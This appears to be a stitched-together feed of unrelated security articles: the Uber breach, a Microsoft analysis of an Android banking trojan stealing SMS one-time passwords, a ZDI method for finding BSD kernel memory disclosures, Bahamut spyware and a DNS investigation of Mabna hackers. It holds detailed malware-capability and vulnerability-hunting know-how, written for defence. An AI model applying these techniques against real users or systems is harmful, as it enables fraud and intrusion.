third-party contractor's credentials and then tricking that user into approving a multi-factor authentication request. Uber engaged the U.S. Department of Justice and the FBI shortly after learning about the breach and is still investigating it. However, it does not appear that attackers accessed any customer or user data stored by its cloud providers, though they did download some internal messages and information from an internal finance team. ( ZDNet , Washington Post ) New York’s Suffolk County is still recovering from a cyber attack that’s affected multiple areas of the local government. The county’s 911 system was still offline as of Tuesday, with responders forced to switch to pen and paper for tracking emergency calls. They’ve also had to enlist the help of the New York City Police Department to assist with background checks. The attackers may have also stolen and leaked some residents’ personal information and have allegedly posted images of stolen documents on the dark web. The adversaries say they’ve demanded an unspecified “small amount” of money for the return of access to its computers. ( NBC 4 New York , Newsday ) The ChromeLoader malware is more dangerous than ever, according to new research from VMWare and Microsoft. Security researchers at the companies say the malware — which started as a browser-hijacking credential stealer — is now being used as a tool to deliver ransomware and steal sensitive information. The updated version of ChromeLoader has been used in hundreds of attacks over the past few weeks targeting enterprise networks in the education, government, health care and business services industries. Attackers are disguising ChromeLoader as legitimate Chrome browser services and plugins, such as OpenSubtitles, a site designed to help users to find subtitles for popular TV shows and movies.

Masquerading as a banking rewards app, this new version has additional remote access trojan (RAT) capabilities, is more obfuscated, and is currently being used to target customers of Indian banks. The SMS campaign sends out messages containing a link that points to the info-stealing Android malware. The malware’s RAT capabilities allow the attacker to intercept important device notifications such as incoming messages, an apparent effort to catch two-factor authentication (2FA) messages often used by banking and financial institutions. The malware’s ability to steal all SMS messages is also concerning since the data stolen can be used to further steal users’ sensitive info like 2FA messages for email accounts and other personally identifiable information (PII). Figure 1. Typical SMS campaign attack flow Our investigation of this new Android malware version started from our receipt of an SMS message containing a malicious link that led us to the download of a fake banking rewards app. The fake app, detected as TrojanSpy:AndroidOS/Banker.O, used a different bank name and logo compared to a similar malware reported in 2021 . Moreover, we found that this fake app’s command and control (C2) server is related to 75 other malicious APKs based on open-source intelligence. Some of the malicious APKs also use the same Indian bank’s logo as the fake app that we investigated, which could indicate that the actors are continuously generating new versions to keep the campaign going. This blog details our analysis of the recent version’s capabilities. We strongly advise users never to click on unknown links received in SMS messages, emails, or messaging apps. We also recommend seeking your bank’s support or advice on digital options for your bank. Further, ensure that your banking apps are downloaded from official app stores to avoid installing malware. Observed activity What the user sees We have seen other campaigns targeting Indian banks’ customers based on the following app names: Axisbank_rewards.apk Icici_points.apk Icici_rewards.apk SBI_rewards.apk Our investigation focused on icici_rewards.apk (package name: com.example.test_app ), which presents itself as ICICI Rewards. The SMS campaign sends out messages containing a malicious link that leads to installing a malicious APK on a target’s mobile device. To lure users into accessing the link, the SMS claims that the user is being notified to claim a reward from a known Indian bank. Figure 2. The text message with a malicious link sent to users Upon user interaction, it displays a splash screen with the bank logo and proceeds to ask the user to enable specific permissions for the app. Figures 3 and 4. App installed on the Android device. The app asks users to enable permissions on text messaging and contacts, to name a few The fake app asks for credit card information upon being granted all permissions. This should raise users’ suspicions on the app’s motive as apps typically ask for sensitive information only through user-driven transactions like paying for purchases. The app displays another fake screen with further instructions to add to its legitimacy once users supply the information needed. Figures 5 and 6. A fake page where the app asks users to provide information, and the resulting message once data is added What happens in the background Analyzing the XML file AndroidManifest further identifies the entry points of the malware along with the permissions requested. It also defines services that can run in the background without user interaction. The app uses the following permissions: READ_PHONE_STATE ACCESS_NETWORK_STATE READ_SMS RECEIVE_SMS READ_CALL_LOG FOREGROUND_SERVICE MODIFY_AUDIO_SETTINGS READ_CONTACTS RECEIVE_BOOT_COMPLETED WAKE_LOCK The malware uses MainActivity, AutoStartService, and RestartBroadCastReceiverAndroid functions to carry out most of its routines. These three functions interact to ensure all the malware’s routines are up and running and allow the app to remain persistent on the mobile device. MainActivity MainActivity , also called the launcher activity, is defined under com.example.test_app.MainActivity. It is launched first after installation to display the fake app’s ICICI splash screen. This launcher activity then calls OnCreate() method to check the device’s internet connectivity and record the timestamp of the malware’s installation, and Permission_Activity to launch permission requests. Once the permissions are granted , Permission_Activity further calls AutoStartService and login_kotak . Figure 7. Actions under MainActivity The class login_kotak is responsible for stealing the user’s card information. It shows the fake credit card input page (Figure 5) and temporarily stores the information in the device while waiting for commands from the attacker. Figure 8. login_kotak class steals card information and other personally identifiable information (PII) AutoStartService AutoStartService, themain handler of the malware, functions based on the commands it receives. The handler provides the malware with the following capabilities: Enforcing its RAT commands This malware’s new version adds several RAT capabilities that expands its information stealing. It enables the malware to add call log uploading, SMS message and calls interception, and card blocking checks. Figure 9. Code comparison of 2021 (left) and 2022 (right) samples These commands are described below. Command Name Description all_sms_received Flags to enable/disable SMS upload all_call_received Flags to enable/disable call log upload silent Put the mobile device on silent block Checks if the user’s card is blocked sms_filter Filters SMS based on strings (defaults to “ICICI”) online Checks if the user has an active internet connection force_online Uploads received SMS messages to the C2 server is_online Checks if the device is connected to the C2 server force_calls Uploads call logs to the C2 server The silent command, which the malware uses to keep the remote attacker’s SMS sending activities undetected, stands out from the list of commands. Many banking apps require two-factor authentication (2FA), often sent through SMS messages. This malware enabling an infected device’s silent mode allows attackers to catch 2FA messages undetected, further facilitating information theft. Figure 10. This code is responsible for turning the mobile device’s silent mode on Encryption and decryption of SMS messages In addition to encrypting all data it sends to the attacker, the malware also encrypts the SMS commands it receives from the attacker. The malware decrypts the commands through its decryption and decoding modules. The malware uses a combination of Base64 encoding/decoding and AES encryption/decryption methods. Figure 11. The malware’s encoding and decoding modules, as seen in its code Stealing SMS messages The malware steals all SMS messages from the mobile device’s inbox. It collects all received, sent, read, and even unread messages. Collecting all SMS messages might allow attackers to use the data to expand their stealing range, especially if any messages contain other sensitive information such as SMS-based 2FA for email accounts, one’s personal identification like the Aadhar card commonly used in India, or other financial-related information. Figure 12. Code used to steal all SMS messages Uploading all call logs The malware also uploads call logs stored on the mobile device. This data may be used for the attacker’s surveillance purposes. Figure 13. The malware code for stealing call logs Communicating with its C2 This malware uses the open-source library socket.io to communicate with its C2 server. Figure 14. Code showing the malware’s C2 server connection RestartBroadCastReceiver The malware also uses the Android component RestartBroadcastReceive r, which functions based on the type of events received by the mobile device. This receiver launches a job scheduler named JobService, which eventually calls AutoStartService in the background. The receiver reacts when the device is restarted, if the device is connected to or disconnected from charging, when the device’s battery status changes, and changes in the device’s Wi-Fi state . RestartBroadcastReceiver ensures that the main command handler AutoStartService is always up and running. Figure 15. How the Receiver starts AutoStartService Mitigating the fake app’s unwanted extras This malware’s continuing evolution highlights the need to protect mobile devices. Its wider SMS stealing capabilities might allow attackers to the stolen data to further steal from a user’s other banking apps. Its ability to intercept one-time passwords (OTPs) sent over SMS thwarts the protections provided by banks’ two-factor authentication mechanisms, which users and institutions rely on to keep their transactions safe. Its use of various banking and financial organizations’ logos could also attract more targets in the future. App installation on Android is relatively easy due to the operating system’s open nature. However, this openness is often abused by attackers for their gain. Apart from exercising utmost care when clicking on links in messages and installing apps, we recommend that users follow these steps to protect their devices from fake apps and malware: Download and install applications only from official app stores. Android device users can keep the Unknown sources option disabled to stop app installation from unknown sources. Use mobile solutions such as Microsoft Defender for Endpoint on Android to detect malicious applications.

635124b028e9d467ce4282ac,zdayinit,https://www.zerodayinitiative.com/blog/2022/9/19/mindshare-analyzing-bsd-kernels-with-binary-ninja,MindShaRE: Analyzing BSD Kernels for Uninitialized Memory Disclosures using Binary Ninja,Reno Robert,2022-09-21,"Disclosure of uninitialized memory is one of the common problems faced when copying data across trust boundaries. This can happen between the hypervisor and guest OS, kernel and user space, or across the network. The most common bug pattern noticed among these cases is where a structure or union is allocated in memory, and some of the fields or padding bytes are not initialized before copying it across trust boundaries. The question is, is it possible to perform variant analysis of such bugs? The idea here is to perform a control flow insensitive analysis to track all memory store operations statically. Any memory region never written to is identified as uninitialized when the data from it is copied across trust boundaries. Generalizing the code pattern for analysis Consider the case of CVE-2018-17155 , a FreeBSD kernel memory disclosure in the getcontext() and swapcontext() system calls due to a lack of structure initialization. Shown below is the patch for sys_getcontext() . The listing on the left shows the patched code. sys_swapcontext() was patched in a similar fashion. Figure 1 - Patch for sys_getcontext() information disclosure. Vulnerable code appears on the right. The vulnerable code declared a ucontext_t structure on the stack, wrote to some but not all fields, and finally used copyout() to copy UC_COPY_SIZE bytes of data from the structure to userland. The problem here is that not all fields are initialized, so any data occupying the uninitialized parts of the structure memory region are disclosed. To solve the problem, the patched code zeroes out the entire structure using the bzero() function. The generalization of the above code pattern looks like this: • A memory region (structure, union, etc.) is declared on the stack or allocated on the heap, which could be the source of uninitialized memory. • The memory region may get fully or partially written. • There is an API that transfers data across trust boundaries. This could be the sink for uninitialized memory. • The API generally takes at least 3 parameters: source buffer, destination buffer, and size. In this case, the source of the memory is a stack offset, and the size of the transfer is a constant value. A constant size of transfer means the value is either the entire size of the memory region (using sizeof operator) or a part of it until an offset. • The memory region may be zeroed out before usage using functions like memset() or bzero() . The sink function is application-specific. To mention a few of the more likely sinks: copy_to_user() in case of Linux kernel, copyout() in case of BSD kernels, send() or sendto() for network transfers or any wrappers around them. The definitions of these functions are either documented, or else understood by reverse engineering if the target is closed source. Searching the code pattern for analysis Once the sink function and its definition are known, we can query for calls to the sink function with a constant size argument and source buffer pointing to a stack offset or heap memory. Querying for a pointer to stack memory is straightforward, whereas detecting heap pointers requires visiting the definition site of source variables. Consider the definition of copyout() function in BSD: copyout(const void *kaddr, void *uaddr, size_t len) When looking for stack memory disclosures, search for cross-references to the copyout() function where kaddr is pointing to a stack offset and the len parameter is a constant. Binary Ninja has a static data flow feature that propagates known values within a function, including stack frame offsets and type information. Using this feature, it is possible to narrow down calls to copyout() that satisfy our search criteria. To understand this better, let’s inspect the arguments passed to copyout() from sys_getcontext() . Figure 2 - sys_getcontext() invoking copyout(kaddr, uaddr, len) The kaddr parameter, or params[0] , holds a kernel stack pointer, is shown as the stack frame offset -0x398. The value for the len parameter, or params[1] , is shown as the constant 0x330. Since Binary Ninja has no information regarding uaddr , this is shown as <undetermined> . With this register type information for kaddr and len , the following query fetches all instances of calls to copyout() with a kernel stack pointer and constant size: Statically tracking memory stores The core idea of the analysis is to track all the memory store operations using Binary Ninja’s static data flow capability and propagate pointers manually using Single Static Assignment (SSA) form whenever necessary. For tracking stack memory stores in local function scope, we rely on Low-Level IL (LLIL), because Medium Level IL (MLIL) abstracts stack access and might eliminate some of the memory stores. For tracking inter-procedure store operations where the address is passed to another function, we rely on the MLIL SSA form to propagate the pointers. The visitor class implemented to handle IL instructions is based on Josh Watson’s Emilator . Tracking stack memory stores with LLIL In LLIL, any instruction writing to memory is represented as an LLIL_STORE operation. It has a source and destination parameter. The idea is to linearly visit each LLIL instruction in a function and check if it is an LLIL_STORE operation having a stack frame offset as its destination. When a memory store writing to stack is identified, we will log the source offset of the write and its size. Consider a simple 8-byte memory move operation and its corresponding LLIL information provided by Binary Ninja: Figure 3 - LLIL_STORE operation in freebsd32_sigtimedwait() The StackFrameOffset value is the offset from the base of the stack and the size property gives the size of the store operation. Using this information, it is possible to know which memory address are being written. In this case, the addresses from stack base offset -116 to -109 (8 bytes) are being initialized. Static function hooks and memory writing APIs While memory store instructions are one way to initialize memory, functions like memset() and bzero() are frequently used to initialize a memory region with NULLs. Similarly, functions such as memcpy() , memmove() , bcopy() , strncpy() , and strlcpy() are also used to write to a memory region. All these functions have something in common: there is a destination memory pointer and a size to write. If the destination and size values are known, it is possible to know the memory region being written to. Consider the case of bzero() , which is used to clear stack memory in the patched sys_getcontext() : Figure 4 - Clearing stack memory using bzero() By querying the destination pointer and size parameters, it is possible to know their respective values and hence the target memory region. Now let us consider how the analyzer can handle CALL operations. Static hooks are handlers to functions which we intend to handle differently compared to other functions. For any CALL instruction with a known destination i.e., MLIL_CONST_PTR , the symbol is fetched to check for static hooks. A JSON configuration with the function names as well their positional parameters (destination buffer and size) is provided to the analyzer for static hooking: The copyin() function is specific to BSD kernels. It is used to initialize kernel buffers with data from user space. Any target-specific functions to hook can be added to the JSON config and handled in visit_function_hooks() as per necessity. Handling x86 REP optimization Many times compilers optimize memory writing functions into REP instructions or a series of store operations. While store operations introduced due to optimization can be handled like any other store operation, REP instructions requires special handling. Static function hooks are not useful in detecting memory writes due to REP. So how do we handle such optimizations and avoid missing those memory writes? First, let’s look at how Binary Ninja translates the REP instruction in LLIL or MLIL. Figure 5 - memcpy() optimized to REP instruction Figure 6 - REP instruction translation in MLIL The REP instruction repeats the string operation until RCX is 0. The direction of copy operation depends on the Direction Flag (DF), hence the branching where one branch increments the source (RSI) and destination (RDI) pointers and the other decrements them. In general, it is reasonably safe to assume that DF will be 0, and that pointers are incremented. When linearly walking through the ILs, the translated REP instruction will look no different from other instructions. The idea is to check for GOTO instruction, and for every GOTO instruction in IL, fetch the disassembly at the same address. If the disassembly is REP instruction, then fetch the destination pointer as well as size arguments and mark the memory region as initialized. The LLIL has a get_possible_reg_values() API to read values of registers statically. The MLIL provides couple of APIs, get_var_for_reg() and get_ssa_var_version() , to map architecture registers to SSA variables. This is very useful when propagating values manually using SSA variables in the absence of RegisterValueType information (i.e. RegisterValueType.UndeterminedValue ). Similar APIs are currently missing in LLIL and tracked as a feature request: API to get SSARegister for a register at a given LLIL instruction . Tracking Inter-procedure memory stores with MLIL At this point we can track memory store operations, CALL operations such as bzero() , memset() , and also deal with REP optimization. The next task is to track memory writes across function calls, as when a caller passes a memory address to a callee. The interesting challenge here is that once a stack pointer has been passed into another function, it can no longer be tracked using the register value type information (StackFrameOffset) as we did within the local function scope using LLIL (see above). To solve this problem, we propagate the pointers within the callee function using MLIL SSA variables, just like propagating taint information. Whenever a MLIL_STORE_SSA instruction is encountered, we log the offset of the write operation and size values whenever the destination of the memory write operation is resolved manually based on values of SSA variables. The set_function_args() function shown below iterates through MLIL variables and assigns the value (pointer) passed by the caller: Once the initial SSA variables are set, we visit all the instructions linearly to propagate the pointer and log memory writes. While doing this, the most common operation performed on the pointer is addition. Therefore, it is necessary to emulate MLIL_ADD instruction to handle pointer arithmetic operations. Additionally, it is also important to emulate instructions such as MLIL_SUB, MLIL_LSR and MLIL_AND to handle certain pointer-aligning operations in case of optimizations. Here is an example of how these MLIL SSA expressions are resolved to log a memory store operation: Considering the SSA variable rax_43#65 as a manually propagated pointer value, it is possible to resolve the destination of the store operation as well as the size of the write. But when the value of the SSA variable rax_43#65 is not available, this memory is not associated with the pointer that was propagated by the caller and therefore not logged. Handling pointer-aligning optimizations When performing inter-procedure analysis, further optimizations were noticed in addition to the REP optimization as seen in the “Handling x86 REP optimization” section above. A variable allocated on the stack will usually be aligned to meet the needs of upcoming operations. Let’s say a stack pointer is passed to memset() and the compiler inlines the call as a REP instruction. In this case, it is very likely the memory will be allocated at an aligned address such that the fastest instructions can be used during REP operation. However, when a pointer is received as an argument by a callee or as a return value of an allocator function, the compiler may have to generate pointer and size alignment opcodes which could rely on branching decisions before reaching REP instruction. Here is an example of such an optimization commonly found in the NetBSD kernel used for analysis: Figure 7 - An example memset() optimization from NetBSD When such branching decisions are involved, the pointer, as well as the size, can take multiple possible values (from the perspective of static analysis) at the point of REP instruction. This is different from what we observed in the “Handling x86 REP optimization"" section where there is only one possible value for pointer and size. Our goal here is to find the actual value of the pointer and size in the absence of pointer-aligning computations. To achieve this, a couple of SSA expressions were identified that can be used to resolve the original value: • Search for an expression involving ( ADDRESS & BYTESIZE ). This could be the first use of ADDRESS before taking any conditional branches. • Search for an expression involving ( SIZE >> 3 ). This is where the adjusted size is passed to a REP instruction. I had a couple of ideas in mind to track back the above expressions from the point of REP instruction, one relying entirely on SSA and the other based on dominators: • Use get_ssa_var_definition() and get_ssa_var_uses() APIs to get a variable’s definition site and its uses. • Alternatively, get the dominators of the basic block containing the REP instruction and visit the instructions in the dominator blocks. The function resolve_optimization() shown below uses dominators to get the basic blocks to perform the search operation. Since the pointer is manually passed by the caller, the value is fetched from the SSA variables. In the case of a possible constant size value, we fetch the maximum from the list of available size values. Once both pointer and size values are available, we log the memory region as initialized. Tracking memory stores in dynamic memory allocations So far, all our analyses were concentrated on stack memory as the source buffer for information disclosure. This is largely due to the prevalence of stack memory disclosure bugs, as described in KLEAK: Practical Kernel Memory Disclosure Detection (PDF) . What about other memory regions such as the heap? Can we model some of the heap memory disclosures too? When looking for heap memory disclosures, the idea remains the same. We are still looking for calls to sink functions with known size value. But instead of the source pointer being RegisterValueType.StackFrameOffset , we check for RegisterValueType.UndeterminedValue . Consider the code for sys_statfs() : Figure 8 - Dynamic memory allocation in sys_statfs() Here the kernel pointer rdi_1#2 in copyout() is undetermined because Binary Ninja does not know what the allocator function returns. However, by using the SSA form, we can manually track back whether rdi_1#2 is holding the return value of malloc() . For example, follow the highlighted instructions in Figure 8. - the variables are assigned as rax_1#1->r15#1->rdi_1#2 . This information can be obtained programmatically using the MLIL get_ssa_var_definition() API. Once the definition site of an SSA variable is obtained, we can check whether the variable is initialized using a CALL operation as demonstrated below: How does the analyzer know the definition of allocator functions? We can take the same approach used for providing information regarding static function hooks (see the “Static function hooks and memory writing APIs” section above). A JSON configuration with a list of allocator functions and an index of size parameters is provided to the analyzer. For any CALL instruction with a known destination (i.e., MLIL_CONST_PTR ), the symbol is fetched to check for known allocator functions. Here is a sample JSON configuration used for analysis: Once we have established the connection between the source pointer and allocator call, the next question is, what pointer value will be assigned as the return value of the allocator call? The stack pointers as tracked as negative offsets in Binary Ninja as seen below: To have a generalized representation between the stack and heap pointers, I decided to set the return value of a heap allocator calls as a negative value of the size of the allocation. For the malloc() call in sys_statfs() , rax_1#1 is set to -0x1d8 as the starting address. Therefore, the memory region which needs to be initialized ranges from -0x1d8 to 0 [start + size of allocation]. Even when the allocation size is undetermined, starting address can be set to some arbitrary value such as -0x10000. All that matters here is to know whether the contiguous memory region accessed by copyout() is initialized or not. Filtering memory stores using dominators and post dominators A dominator in graph theory provides information on the order of execution of some basic blocks. While we have already used dominators for handling pointer-aligning optimizations in the “Handling pointer aligning optimizations” section, this section details the usage of dominators in detecting control flow-sensitive memory store operations. To analyze uninitialized memory disclosures, we explore two ideas: dominators and post-dominators. A basic block X is said to dominate another basic block Y if all paths to Y should go through X. A basic block Y is said to post-dominate basic block X if all paths from X to any of the function’s return blocks should go through Y. Consider this example from Wikipedia: Figure 9 - Graph demonstrating dominators and post dominators In the provided graph, node B dominates nodes C, D, E, and F because all paths to these nodes must go through node B. By definition, every node dominates itself, so the set of all nodes dominated by node B will be B, C, D, E, and F. Also, node A dominates all the nodes in the graph. Therefore, the dominators of nodes C, D, E, F are A and B. Similarly, when A is considered as the function entry node, with E and F being exit nodes, node B is the post-dominator of node A. This is because all paths from A to the exit nodes must go through B. Now, how can dominators and post-dominators help us in this analysis? We can perform dominator analysis on the callers of the sink function. The idea is to log only memory stores in basic blocks which dominate the basic block calling copyout() , that is, basic blocks which will be executed irrespective of branching decisions. Consider the code below: Figure 10 - Dominators of basic block calling copyout() Here the basic block calling copyout() is <mlil block: x86_64@32-35> and there are five dominator blocks in the path from the function entry to copyout() . When performing dominator-based analysis, we will log only memory stores within these five dominator blocks. The memory store operations in other basic blocks might be skipped and not execute. The same is the case with the callee function. We will perform an inter-procedure analysis only when the function is called from a dominator block. Post-dominator analysis is done on the callee function during an inter-procedure analysis. It is meant to find bugs where a callee can possibly return before initializing the memory region it is supposed to. Consider the callee function do_sys_waitid() from figure 10. Figure 11 - Post dominators of function entry block in do_sys_waitid() The function entry block <mlil block: x86_64@0-8> is always executed. The other basic blocks that are executed irrespective of the branching decisions are <mlil block: x86_64@14-22> and <mlil block: x86_64@8-9> . Once again, memory stores and callee analysis are limited only to these three basic blocks. Dominator- and post-dominator-based analysis tries to fill the gaps in control flow insensitive analysis performed by the analyzer. The general assumption here is that memory is initialized or cleared before performing further operations and therefore dominates other basic blocks. However, this assumption is not always true. For example, there are cases where individual code paths can perform the same operation as done in the dominators. Moreover, when a callee returns due to any error condition, the return value could be validated by the caller before calling copyout() . Consequently, dominator-based analysis as done in this implementation is prone to large numbers of false positives. Checking for uninitialized memory disclosures Once all the memory store operations are statically logged with information on offset and size of write, the memory region copied out to user space using copyout() can be evaluated for uninitialized memory disclosure. Consider the call to copyout() shown below: The source pointer is -0x398 and the size copied is 0x330 bytes. Therefore, the analyzer has to validate if all the bytes in the memory range from -0x398 to (-0x398 + 0x330) are initialized, and if not, flag that as a bug. False positives and limitations The analyzer is written with the goal of finding memory regions that never get written to in any possible code paths. False positives occur in cases when it is unable to track a memory store operation. Below are some common false positive conditions and limitations of the implementation: • The analyzer does not emulate branching instructions. Therefore, false positives are seen in code constructs involving control flow decisions. Consider a memory region such as an array that is initialized in a loop operation. In this case, the store operation would be detected only once because the loop body is visited only once by the analyzer, and not in a loop as it would be during execution. • Indirect calls are not resolved statically. Consequently, any memory store done during indirect calls is not tracked. • Optimizations may make it harder to track memory stores. Some common optimizations noticed were tackled in the “Handling x86 REP optimization” and “Handling pointer aligning optimizations” sections. • Binary Ninja may wrongly detect type information of functions used for static hooking or sink functions like copyout() . Since our analysis relies on RegisterValueType information, any failure to accurately detect the function prototype may lead to false results. Verify the type information before analysis and update if necessary. • The analyzer looks only for code patterns where the memory source and sink function are within the same function. There is no tracking back of memory source beyond the local function scope. • Dominator analysis is experimental. You should use it only as a guideline to perform code reviews. When there is access to source code, some of these false positives can be resolved by changing the optimization flags or by unrolling loops to reduce branching decisions. Analysis and results The target kernel executable is loaded in Binary Ninja to generate the BNDB analysis database. Then the analyzer is executed against the database for faster analysis. There are a couple of scripts: one for analyzing stack memory disclosures and another for analyzing sink functions with known size and unknown source pointer. Since the source pointer could be from a heap allocator, provide a JSON configuration with a list of allocator functions as an argument. The dominator analysis is experimental. You need to enable it using an optional argument when needed: Conclusion The scripts were tested on Binary Ninja version 2.4.2846 against FreeBSD 11.4, NetBSD 9.2, and OpenBSD 6.9 kernels. Amongst the results, code paths that are possibly reachable for an unprivileged user were evaluated. The OpenBSD bugs were found in sysctls related to multicast routing in IPv4 as well as IPv6, which are tracked as ZDI-22-073 and ZDI-22-012 respectively. The four vulnerabilities ( ZDI-22-075 , ZDI-22-1036 , ZDI-22-1037 , ZDI-22-1067 ) found in NetBSD are related to syscalls supporting backward compatibility for older NetBSD releases ZDI-22-075 and ZDI-22-1036 are information disclosures in VFS syscalls for NetBSD 3.0 and NetBSD 5.0 respectively. Details regarding the fixes can be found here . Next, ZDI-22-1037 is an information disclosure in getkerneinfo syscall for NetBSD 4.3. This bug was fixed with many other potential issues as seen here . Finally, ZDI-22-1067 is another information disclosure related to VFS syscalls but in NetBSD 2.0 compatibility. Details regarding the fix can be found here . The FreeBSD bug found in version 11.4 was also related to compatibility, which in this case for supporting 32-bit binaries. However, this bug was fixed without a disclosure during a large change done for the 64-bit inode . The uninitialized structure fields were cleared in the copy_stat function as part of the 64-bit inode project. Though this commit was in May 2017, it was tagged to release 12.0 and above. Therefore, the bug remained unfixed in release 11.4 until it reached EOL in September 2021, soon after our bug report. Putting it together, most of the bugs were found in BSD’s compatibility layers. Additionally, all these bugs are stack memory disclosures. For anyone interested, the source code for the project can be found here .

The first alert of this new campaign was seen on Twitter , with the MalwareHunterTeam publishing new indicators of comprising (IoCs) about a new malware piece. Details on the malicious APK are shown below. Figure 1: Malicious APK from the newest campaign of the Bahamut APT group. The new campaign has been ongoing since April 2022, and the operators behind the threat developed a website to download a potential legitimate app to lure victims. As mentioned by some security experts, “ the phishing sites were masked as genuine websites for downloading a messaging application that provides secure communication .” In addition, the malicious application has also been distributed via obscene websites in the wild by criminals. Figure 2: Malicious website pretending to be a genuine mobile platform for secure messaging ( source ). As mentioned in a publication by Cyble , the phishing website looks professional, and the criminals are presenting the application features on the Features menu and the Contact Us and Subscribe page, as observed in Figure 3 below. With these details in place, victims are convinced to download the malicious APK and install it on their devices. Figure 3: Features of the malicious APK from the Bahamut ongoing campaign. As can be seen, criminals are offering a lot of features, including: VPN inbuilt: Now with an inbuild VPN connection to ensure an extra layer of security. One-one chat: Fast and efficient one-one chatting. Group chat: Create and chat with many people groups easily. Security paramount: We take the security and data of our users seriously. End-to-end encrypted : All chats are end-to-end encrypted to prevent data theft. Attachment upload: Send media and attachments to friends in-app easily. Digging into the APK details The malicious Android package file abuses certain permissions requested during the installation process. Some of them are READ_SMS , READ_CONTACTS , READ_CALL_LOG and RECEIVE_SMS . Figure 4: Part of app permissions requested during the installation process ( source ). Looking at the app permissions is expected the abusage of chatting applications due to the nature and past campaigns in which Bahamut groups had been involved. By comparing the similarities between this malicious APK and old samples of Bahamut Android Spyware, the Cyble team observed that some extra modules were added. These modules are related to messaging applications, including Viber, Imo, Signal and Telegram. Figure 5: Similarities between the Bahamut Android Spyware sample modules and the new Android package file distributed in 2022 ( source ). In detail, the target applications are the following: com.viber.voip com.protectedtext.android com.facebook.orca com.imo.android.imoim org.telegram.messenger com.whatsapp com.secapp.tor.conion org.thoughtcrime.securesms The application executes in the background, captures the victims’ chats and secrets, and sends all the information to the malicious C2 server. Also, details from internal storage, such as documents and photos, are obtained and stolen by criminals. Figure 6: Command and Control (C&C) server used in the Bahamut campaign in 2022. Preventive measures against the Bahamut malware Mobile malware has been distributed with new and dangerous techniques for spreading and manipulating data or stealing users’ secrets. These malicious pieces use social engineering schemas to lure victims into downloading malicious applications and executing them on their devices. After that, and taking advantage of legitimate applications such as Telegram, Signal and WhatsApp, criminals can perform a lot of malicious activities, including: Disseminating malware via messages Stealing the users’ secrets from legitimate applications or the internal storage Creating fake messages and sending them via legitimate applications Extort users by threatening to send sensitive data or malicious links to all user’s contacts or WhatsApp groups (the best target from the malicious perspective). In this sense, prevention is crucial to stop these kinds of threats . Before downloading and installing a new app, check if the source is trusted and if app permissions align with its purpose.

Their victims included about 320 universities and over 50 private, government, and nongovernmental organizations in several countries. WhoisXML API investigated the group’s massive cybercriminal activities through the DNS lens, allowing us to map out the hacking group’s digital footprint using his initial findings. Among our key findings include: A sample of the additional artifacts obtained from our analysis is available for download from our website . The investigation began with eight email addresses known to be used by the threat actors in their campaigns. Using Reverse WHOIS API , we found that seven were used to register dozens of domains, while one was the registrant email address of 9,976 domains at one point. We didn’t include these domains in our analysis since a domain name investor could own the email address. The remaining domains were tied to 68 IP addresses that do not appear to be shared or public IP addresses since most of them only had less than 50 resolving domains. We uncovered 1,426 domains resolving to these IP addresses with the help of Reverse IP/DNS API . We performed a DNS analysis on the IP- and email-connected domains to determine their common locations, registrars, and ISPs. The findings are detailed below. Most of the domains suspected to be involved in the Mabna hackers’ criminal activities were geolocated and registered in the U.S. Several resolving domains were also geolocated in Iran. The chart below shows the locations of the Mabna-connected properties based on their registrant countries and IP geolocations. We also looked at the most common registrars and ISPs used by the domains, as they have the authority to take down malicious properties. GoDaddy topped the list of registrars, accounting for 17% of the domains. CSL Company followed with a 12% share. The rest of the top 10 registrars only accounted for 3% or less of the domain registrations each. As for the ISPs of the resolving domains, Amazon took the lead, accounting for 19% of the resolutions. Sewan and OVH followed with 14% and 10% shares, respectively. The rest of the top 10 ISPs are shown below. Nearly half of the domains were expectedly under the .com space since it is the largest TLD. Aside from .com, .ir and .tk topped the list, with 26% and 10% shares, respectively. Note that Spamhaus tagged .tk as among the most abused TLDs as of 1 September 2022, with 24.4% of its domains considered malicious. At first glance, the domains appeared to have been primarily created using random character sets. Examples include 6ry3m[.]tk, 6sihr[.]tk, 7460u[.]tk, and 7nf6g[.]tk. Some domains contained purely numbers, such as 88750008[.]com, 88750010[.]com, 88878001[.]com, and 88878002[.]com. However, there were also technical-themed strings that repeatedly appeared, such as “ns2,” “ns1,” “mail,” “webdisk,” “cpanel,” “cpcalendars,” and “smtp.” Among the domains that stood out for their content was imqlr[.]tk, since it hosted or redirected to a page that contained a list of Android hacking tools. It resolved to the IP address 195[.]20[.]44[.]121, which it shared with 30 other domains. Cybercriminals like the Mabna hackers may be elusive, but they also leave digital footprints that we can analyze and trace to help the cybersecurity community avoid the threat actors’ resources and campaigns.

Uber said an external contractor had its account compromised, likely due to the hacker buying the person's corporate password on the ""dark web"". The credentials were exposed after the contractor's personal device was infected by unnamed malware, Uber said. Two-factor authentication initially kept the hacker out of Uber's accounts, but the attacker persisted and obtained access after the contractor accepted a log-in request. Once in, the hacker accessed other employee accounts and gained elevated permissions to tools like Uber's Google G-Suite and Slack. The attacker was also able to reconfigure Uber's OpenDNS settings ""to display a graphic image to employees on some internal sites"". Uber said it has found which employee accounts were compromised and reset the passwords for those. The company has also disabled and reset access to many potentially affected internal tools and services, and locked down its code base to prevent any changes being made to it.

An update to the ISM [ pdf ] on Thursday last week introduced three new controls, numbered ISM-1790, ISM-1791 and ISM-1792. The controls ask the buyers of IT - “applications, ICT equipment and services” - to verify the integrity of what they’ve bought “as part of acceptance of products and services”, and then to maintain integrity. They also seek action to determine the “authenticity” of products and services at acceptance. The ISM offers some guidance on the type of checks that could be used to comply with the controls. “Applications may benefit from delivery via encrypted communication channels while ICT equipment may benefit from tracking and tamper-evident packaging,” it advises. “In doing so, such measures are only beneficial if they are assessed as part of acceptance of products and services. “In all cases, suppliers should be consulted on how best to confirm the integrity of their products and services.” The ISM adds that while integrity is important, “so is ensuring … authenticity.” “For example, a counterfeit product or service securely delivered is still a counterfeit product or service that may not operate as intended or pose a risk to the security of a system,” the ISM states. “To assist in identifying counterfeit products and services, suppliers should be consulted on how best to confirm the authenticity of their products and services.” The new controls and guidance come just months after a major Cisco counterfeiting operation was dismantled , albeit not before raking in an alleged US$100 million in revenue and catching out US hospitals, government agencies, schools and military that purchased dud switches and routers. Buyers allegedly experienced equiment failure, as well as performance, functionality and safety issues. The counterfeit boxes were built from substandard components and ran pirated software, according to investigators. An ACSC spokesperson would not be drawn on the timing of the controls being added to the ISM. The spokesperson told iTnews that the new controls ""provide additional clarity to organisations to help them more easily exercise due diligence with their procurements of products."" ""Ultimately, effective cyber supply chain risk management is based upon trusted partnerships between suppliers, manufacturers, distributors, retailers and their customers,"" the spokesperson 